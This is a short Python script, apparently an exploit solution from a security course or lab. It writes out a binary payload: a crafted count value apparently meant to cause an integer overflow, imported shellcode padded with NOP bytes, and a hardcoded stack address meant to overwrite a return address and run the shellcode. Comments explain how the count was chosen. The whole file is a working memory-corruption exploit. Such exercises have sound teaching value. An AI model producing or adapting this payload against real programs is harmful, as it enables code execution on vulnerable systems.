from shellcode import shellcode
import sys

# count needs to be 0x[F-4]1 0...0 (size of shellcode + garbage?)
# so at least 0x[F-4]1 0...0 35
# because of mult of 4, must write 0x90 (nop) 3x (size of shellcode) times, minimum
if __name__ == "__main__":
    #shell_len = len(shellcode)
    new_code = shellcode + b"\x90\x90\x90" # append 3 nop

    sys.stdout.buffer.write(b"\x04\x00\x00\x80") # count
    
    # to do: print shell code here with 3 appended nop
    
    sys.stdout.buffer.write(new_code)

    sys.stdout.buffer.write(b"\x90" * 4)
    sys.stdout.buffer.write(b"\x40\xd8\xf6\xff") #address of buff
    
